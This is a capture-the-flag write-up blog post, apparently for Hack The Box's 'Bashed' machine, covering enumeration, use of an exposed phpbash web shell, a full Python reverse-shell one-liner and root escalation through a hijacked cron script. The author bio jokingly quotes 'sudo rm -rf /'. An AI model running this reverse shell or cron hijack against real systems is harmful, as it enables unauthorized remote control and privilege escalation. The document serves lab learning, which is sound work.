{"title":"blog#1","uid":"e2770a9e378da55d2b296a958a5f336a","slug":"blog-1","date":"2024-05-24T12:47:20.000Z","updated":"2024-05-24T12:50:36.902Z","comments":true,"path":"api/articles/blog-1.json","keywords":null,"cover":[],"content":"<h1 id=\"BASHED\"><a href=\"#BASHED\" class=\"headerlink\" title=\"BASHED\"></a>BASHED</h1><p><strong>Introduction:</strong></p>\n<p>On Tuesday, October 10th, the night air felt unusually brisk. While this detail might seem unrelated, it sets the stage for our journey. Let‚Äôs delve into the core of the matter without further ado.</p>\n<p>So, lets Enumerate the Ip</p>\n<p><strong>Enumeration:</strong></p>\n<p>The first rule of hacking, akin to starting a vehicle with a key, is to enumerate the target. Here, we begin by enumerating the IP address:</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled.png\" alt=\"Untitled\"></p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%201.png\" alt=\"Untitled\"></p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%202.png\" alt=\"Untitled\"></p>\n<p>All I found in that IP address is a normal website lets just brute force it with our super directory brute forcing tool Gobuster<br>(you can even use  dirbuster depends on the choice of you)</p>\n<p>when it started to list out the directories , it came across few intresting </p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%203.png\" alt=\"Untitled\"></p>\n<p>well &#x2F;dev seems intresting<br>navigating to &#x2F;dev and then phpbash<br>we got answer for question 2</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%204.png\" alt=\"Untitled\"></p>\n<p><strong>Exploitation:</strong></p>\n<p>Upon accessing the website, I encountered the user interface with the username</p>\n<p><strong>www-data</strong></p>\n<p>, which serves as the answer for question 3:</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%205.png\" alt=\"Untitled\"></p>\n<p>I need to generate a reverse shell and setup a netcat listener </p>\n<p>I found the following reverse shell code and used my tun0 ip<br>(if you don‚Äôt have tun0 ip use eth0 ip)</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">python -c <span class=\"string\">&#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;10.10.14.3&quot;,8686)); //Change IP and Port </span></span><br><span class=\"line\"><span class=\"string\">os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#x27;</span></span><br></pre></td></tr></table></figure>\n\n<p>I‚Äôm gonna use 8686 so start a netcat listener with same port</p>\n<p>After successful execution of reverse shell I got the following in my listener</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%206.png\" alt=\"Untitled\"></p>\n<p><strong>Note</strong> in order to make the reverse shell listener interactive run the following code in listener<br><strong>python -c ‚Äòimport pty; pty.spawn(‚Äù&#x2F;bin&#x2F;bash‚Äù);‚Äô</strong></p>\n<p>As the question pointed out the flag is in user <strong>arrexel</strong> folder which is in home directory</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%207.png\" alt=\"Untitled\"></p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%208.png\" alt=\"Untitled\"></p>\n<p>Well First part is done on to privilege escalation</p>\n<p>run the command sudo -l  to see what command can www-get can run without requiring password or permissions from root user</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%209.png\" alt=\"Untitled\"></p>\n<p>As the picture depicts it is  scriptmanager</p>\n<p>To switch to user scriptmanager<br>run this command<br>                                                    <strong>sudo -u scriptmanager &#x2F;bin&#x2F;bash</strong><br>The explanation for the flags are<br><strong><code>sudo</code></strong>: This is the command used to allow a permitted user to execute a command as the superuser                </p>\n<p><strong><code>-u scriptmanager</code></strong>: This option tells <strong><code>sudo</code></strong> to run the subsequent command (<strong><code>/bin/bash</code></strong> in this case) as the user specified after <strong><code>-u</code></strong>, which is <strong><code>scriptmanager</code></strong> in this case.</p>\n<p><strong><code>/bin/bash</code></strong>: This is the command that will be executed with superuser privileges. In this example, it‚Äôs invoking the Bash shell.</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2010.png\" alt=\"Untitled\"></p>\n<p>There is an interesting directory which access only  for user scriptmanager</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2011.png\" alt=\"Untitled\"></p>\n<p>The answer for question 5 is cd &#x2F;scripts</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2012.png\" alt=\"Untitled\"></p>\n<p>Going on</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2013.png\" alt=\"Untitled\"></p>\n<p>I checked the folder and its files</p>\n<p>There is a simple script in¬†<strong>‚Äòtest.py‚Äô</strong>¬†which writes output on file¬†<strong>‚Äòtest.txt‚Äô</strong>. One more interesting thing we got is that creation time of file test.txt is keep updating to the latest time. This mean there is a cron job or something like background process is running which runs test.py script automatically. If we replace the test.py file with our test.py file containing reverse shell code and check might we can get reverse shell of root user or not.</p>\n<p>In order to do that create a HTTP Server using python from the directory where we have saved our reverse shell code.</p>\n<p>since the <strong>test.py</strong> is being executed by cron job i can use the same reverse shell code at the start of this machine</p>\n<p>before that i need to setup a python web server to download that reverse shell into listner shell</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2014.png\" alt=\"Untitled\"></p>\n<p>the command is<br>python3 -m http.server 8000</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2015.png\" alt=\"Untitled\"></p>\n<p>After setting up server download the file to reverse shell listener </p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2016.png\" alt=\"Untitled\"></p>\n<p>After successful download start another netcat listener to capture root shell</p>\n<p>Since our reverse shell program saved as test.py.1 , we need to change it as original file name ,</p>\n<pre><code>                                           **rm test.py and mv test.py.1**\n</code></pre>\n<p>So , for reverse shell listener I have used 4422 port number and wait for few minutes , and let the cronjob do its job .</p>\n<p>After a couple of minutes , you can see your listener founds a shell</p>\n<p>Tip: if the the shell didn‚Äôt pick anything in 2 mins try running the program once to check for syntaxes </p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2017.png\" alt=\"Untitled\"></p>\n<p>There you go enjoy the Root flag</p>\n<p><img src=\"/BASHED%20649151f60cd84e7c842262796633ac07/Untitled%2018.png\" alt=\"Untitled\"></p>\n<p><strong>Conclusion:</strong></p>\n<p>In conclusion, the Bashed machine on Hack The Box presented a series of challenges that required meticulous enumeration, exploitation, and privilege escalation. By following these steps, I successfully navigated through the obstacles and obtained the root flag.</p>\n","text":"BASHEDIntroduction: On Tuesday, October 10th, the night air felt unusually brisk...","permalink":"/post/blog-1","photos":[],"count_time":{"symbolsCount":"4.5k","symbolsTime":"4 mins."},"categories":[],"tags":[],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#BASHED\"><span class=\"toc-text\">BASHED</span></a></li></ol>","author":{"name":"dkvv_varma","slug":"blog-author","avatar":"https://media.licdn.com/dms/image/D5603AQHDAkzc5VpLcQ/profile-displayphoto-shrink_800_800/0/1708273426443?e=1721260800&v=beta&t=6mDy44GnhG2deGxjMd9TUFy-WKUpt7jNSNcdJD47uYc","link":"https://media.licdn.com/dms/image/D5603AQHDAkzc5VpLcQ/profile-displayphoto-shrink_800_800/0/1708273426443?e=1721260800&v=beta&t=6mDy44GnhG2deGxjMd9TUFy-WKUpt7jNSNcdJD47uYc","description":"An Aspiring Penetration Tester & a security Enthusiast üöÄ 127.0.0.1 / sudo rm -rf / üòÅ Dont Drink and Root üëÄ","socials":{"github":"https://github.com/dkvvvarma","twitter":"https://x.com/dkvvvarma","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"instagram":{"icon":"fab fa-instagram","link":"https://instagram.com/dkvv_varma"}}}},"mapped":true,"hidden":false,"prev_post":{},"next_post":{"title":"Hello World","uid":"b9663f58f18133b35bfe243f3e916a80","slug":"hello-world","date":"2024-05-24T11:55:51.615Z","updated":"2024-05-24T11:55:51.616Z","comments":true,"path":"api/articles/hello-world.json","keywords":null,"cover":null,"text":"Welcome to Hexo! This is your very first post. Check documentation for more info...","permalink":"/post/hello-world","photos":[],"count_time":{"symbolsCount":444,"symbolsTime":"1 mins."},"categories":[],"tags":[],"author":{"name":"dkvv_varma","slug":"blog-author","avatar":"https://media.licdn.com/dms/image/D5603AQHDAkzc5VpLcQ/profile-displayphoto-shrink_800_800/0/1708273426443?e=1721260800&v=beta&t=6mDy44GnhG2deGxjMd9TUFy-WKUpt7jNSNcdJD47uYc","link":"https://media.licdn.com/dms/image/D5603AQHDAkzc5VpLcQ/profile-displayphoto-shrink_800_800/0/1708273426443?e=1721260800&v=beta&t=6mDy44GnhG2deGxjMd9TUFy-WKUpt7jNSNcdJD47uYc","description":"An Aspiring Penetration Tester & a security Enthusiast üöÄ 127.0.0.1 / sudo rm -rf / üòÅ Dont Drink and Root üëÄ","socials":{"github":"https://github.com/dkvvvarma","twitter":"https://x.com/dkvvvarma","stackoverflow":"","wechat":"","qq":"","weibo":"","zhihu":"","csdn":"","juejin":"","customs":{"instagram":{"icon":"fab fa-instagram","link":"https://instagram.com/dkvv_varma"}}}}}}